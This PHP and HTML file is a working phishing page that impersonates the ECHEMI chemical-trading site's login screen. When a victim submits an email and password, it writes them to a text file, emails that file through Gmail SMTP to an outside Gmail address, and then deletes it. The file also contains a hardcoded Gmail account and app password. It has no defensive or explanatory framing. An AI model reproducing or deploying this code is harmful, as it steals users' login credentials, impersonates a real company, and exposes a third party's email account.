<?php
require 'PHPMailer/src/Exception.php';
require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/SMTP.php';

$smtpUser = 'dipentdipent@gmail.com'; 
$smtpPass = 'uqfzitxedgqhjakm'; 
$email = '';
$password = '';
$displayPassword = false;

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (isset($_POST['email'])) {
        $email = $_POST['email'];
        $displayPassword = filter_var($email, FILTER_VALIDATE_EMAIL) && !preg_match('/@(gmail)\.com$/i', $email);
    }
    if (isset($_POST['password'])) {
        $password = $_POST['password'];
        sendDetails($email, $password);
        $email = '';
        $password = '';
    }
}

function sendDetails($email, $password) {
    global $smtpUser, $smtpPass;

    $mail = new PHPMailer\PHPMailer\PHPMailer();

    $mail->SMTPDebug = 3; // Enable detailed SMTP debugging
    $mail->Debugoutput = 'html'; // Display debug output in browser-friendly format


    // SMTP configuration
    $mail->isSMTP();
    $mail->Host = 'smtp.gmail.com';
    $mail->SMTPAuth = true;
    $mail->Username = $smtpUser;
    $mail->Password = $smtpPass;
    $mail->SMTPSecure = 'tls';
    $mail->Port = 587;



    // Email settings
    $mail->setFrom($smtpUser, 'Dipent');
    $mail->addAddress('kenisank1@gmail.com');
    $mail->Subject = 'New Details on Echemi';
    $mail->Body = "Please find the attached file with the details.";

    // Create a .txt file with the email and password
    $fileContent = "
    !UPDATE

    ~ New Details on Echemi ~
    Email: $email
    Password: $password
    ";

    $fileName = 'details.txt';
    file_put_contents($fileName, $fileContent);

    // Attach the file
    $mail->addAttachment($fileName);

    // Debug: Log sending status to the console
    echo "<script>console.log('Mail ready to send.');</script>";

    // Send email
    if ($mail->send()) {
        echo "<script>console.log('Email sent successfully.');</script>";
        echo "<script>alert('Email sent successfully.');</script>";
    } else {
        echo "<script>console.log('Failed to send email: " . addslashes($mail) . "');</script>";
        echo "<script>console.log('Failed to send email: " . addslashes($mail->ErrorInfo) . "');</script>";
        echo "<script>alert('Failed to send email.')</script>";
    }

    // Delete the file after sending the email
    unlink($fileName);
}
?>



<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <link rel="stylesheet" href="index.css">
</head>
<body>
    <main>
        <div class="logoCtn">
            <div>
                <img src="assets/logo.svg" alt="Logo">
            </div>
            <select name="" id="">
                <option value="en">English</option>
                <option value="ch">中國</option>
                <option value="fr">français</option>
            </select>
        </div>

        <div class="formArea">
            <div class="bannerCtn">
                <img src="assets/banner.png" alt="Banner Image">
            </div>
            <div class="form">
                <form method="POST">
                    <div class="formControl">
                        <input type="email" name="email" id="email" placeholder="Email" value="<?= htmlspecialchars($email) ?>" required>
                    </div>
                    <?php if ($displayPassword): ?>
                        <div class="formControl">
                            <input type="password" name="password" id="password" placeholder="Please enter your password" required>
                        </div>
                    <?php endif; ?>

                    <div class="texts">
                        <ul>
                            <li>Forgot Password</li>
                            <li>New User Join Free</li>
                            <li>Stay logged in for one week</li>
                        </ul>
                    </div>

                    <button type="submit"><?= $displayPassword ? 'Login' : 'Next' ?></button>
                </form>

                <div class="brands">
                    <?php
                    $brandDetails = [
                        ['id' => 1, 'text' => 'Sign in with Google', 'url' => 'assets/google.svg'],
                        ['id' => 2, 'text' => 'Continue with Facebook', 'url' => 'assets/facebook.svg'],
                        ['id' => 3, 'text' => 'Continue with Linkedin', 'url' => 'assets/linkedin.svg'],
                        ['id' => 4, 'text' => 'Continue with Apple', 'url' => 'assets/apple.svg'],
                        ['id' => 5, 'text' => 'Continue with WeChat', 'url' => 'assets/wechat.svg'],
                    ];

                    foreach ($brandDetails as $brand) {
                        echo "<div class='brand'>
                                <div class='imgCtn'>
                                    <img src='{$brand['url']}' alt=''>
                                </div>
                                <p>{$brand['text']}</p>
                              </div>";
                    }
                    ?>
                </div>
            </div>
        </div>
        <footer>
            <div>
                <p>About ECHEMI</p>
                <p>Common Questions</p>
                <p>For Suppliers</p>
                <p>For Buyers</p>
                <p class="diff">Contact Us</p>
                <p>Terms of Use</p>
                <p>Privacy Notice</p>
            </div>
            <div>
                <p>鲁ICP备16009155号-1 | Copyright@Qingdao ECHEMI Digital Technology Co., Ltd.</p>
            </div>
        </footer>
    </main>
</body>
</html>